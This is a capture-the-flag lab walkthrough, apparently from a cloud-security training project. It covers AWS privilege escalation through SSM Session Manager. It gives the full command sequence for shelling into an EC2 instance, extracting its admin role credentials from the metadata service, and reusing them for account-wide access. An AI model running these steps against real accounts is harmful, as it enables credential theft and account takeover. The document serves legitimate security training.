# Guided Walkthrough: One-Hop Privilege Escalation via ssm:StartSession

This scenario demonstrates a privilege escalation vulnerability where an IAM user has permission to start interactive sessions on EC2 instances via AWS Systems Manager (SSM) Session Manager. The attacker can establish an interactive shell session on an EC2 instance that has an administrative IAM role attached, extract the temporary credentials from the EC2 instance metadata service (IMDS), and then use those credentials locally to gain full administrator access.

This attack vector is particularly dangerous because SSM Session Manager provides SSH-like access through the AWS API without requiring any network connectivity, open SSH ports, or SSH keys. The access is completely API-driven, making it attractive for attackers and often granted broadly across engineering teams for legitimate troubleshooting purposes. Unlike traditional SSH, SSM sessions can be initiated from anywhere with valid AWS credentials, bypassing traditional network security controls like security groups and NACLs.

The attack leaves minimal forensic evidence if SSM Session Manager logging is not properly configured, and the extracted credentials are time-limited but fully functional AWS credentials that can be used from any location to perform any action the instance role permits.

## The Challenge

You have obtained credentials for `pl-prod-ssm-001-to-admin-starting-user` — a low-privilege IAM user in the account. This user has `ssm:StartSession` permission, which looks innocuous at first glance: it's commonly handed out to developers and operations teams for troubleshooting access.

Your goal is to achieve effective administrator access to the AWS account. Somewhere in this account is an EC2 instance with the SSM agent running and an administrative role attached. The path to admin runs through that instance.

Start by confirming what you're working with:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see yourself as `pl-prod-ssm-001-to-admin-starting-user`. Now confirm you can't do anything interesting yet:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Good. No admin access yet.

## Reconnaissance

First, let's figure out what EC2 instances are in the account and which ones are reachable via SSM. If you have `ec2:DescribeInstances` (the starting user does), check what's running:

```bash
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile.Arn]' \
  --output table
```

You'll spot an instance with an instance profile attached — that's your target. Next, confirm the SSM agent is online and the instance is reachable:

```bash
aws ssm describe-instance-information \
  --query 'InstanceInformationList[*].[InstanceId,PingStatus,ComputerName]' \
  --output table
```

Look for `Online` in the PingStatus column. Once you have the instance ID, you have everything you need.

## Exploitation

Now comes the interesting part. You're going to open an interactive shell on the target EC2 instance — no SSH key, no open ports, no VPN required. Just an AWS API call:

```bash
aws ssm start-session --target <instance-id>
```

After a moment you'll drop into an interactive shell on the instance. You're now running code inside the EC2 instance's environment. That means you have access to the Instance Metadata Service (IMDS) — the endpoint at `169.254.169.254` that EC2 instances use to retrieve their own identity and credentials.

Inside the SSM session, retrieve an IMDSv2 token first (this instance has IMDSv2 enabled, so you need the session token):

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
```

Now get the name of the IAM role attached to this instance:

```bash
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
echo $ROLE_NAME
# pl-prod-ssm-001-to-admin-ec2-role
```

There it is: `pl-prod-ssm-001-to-admin-ec2-role`. Now pull the temporary credentials for that role:

```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null
```

You'll get a JSON response like:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-04-01T12:00:00Z"
}
```

Copy this output, then type `exit` to leave the SSM session and return to your local machine.

## Verification

Back on your local machine, configure the extracted credentials as environment variables:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

Now verify who you are:

```bash
aws sts get-caller-identity
```

You should see the assumed-role ARN for `pl-prod-ssm-001-to-admin-ec2-role`. Now test admin access:

```bash
aws iam list-users --max-items 3 --output table
```

It works. You have administrator access to the AWS account.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy attached to the EC2 role provides implicitly — and you are now operating as that role.

Using the extracted EC2 instance role credentials (the environment variables you set in the previous step), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ssm-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You started with a single IAM permission — `ssm:StartSession` — that gave you interactive shell access to an EC2 instance. That instance had an administrative IAM role attached, and EC2's Instance Metadata Service made those role credentials available to anything running on the instance (including you, once you were inside the SSM session).

This is a classic "existing passrole" scenario: the instance was already configured with a powerful role before you arrived. You didn't modify any IAM policies or create any new resources. You simply exploited the existing trust relationship between the instance and its role by routing through the SSM API to get inside the instance's trust boundary.

In real environments this pattern appears when teams grant broad `ssm:StartSession` permissions for operational convenience — "everyone on the ops team needs to be able to SSH into any instance." Combined with EC2 instances that carry powerful roles for legitimate application purposes, it creates a reliable one-hop escalation path from any compromised developer credential to full account compromise.
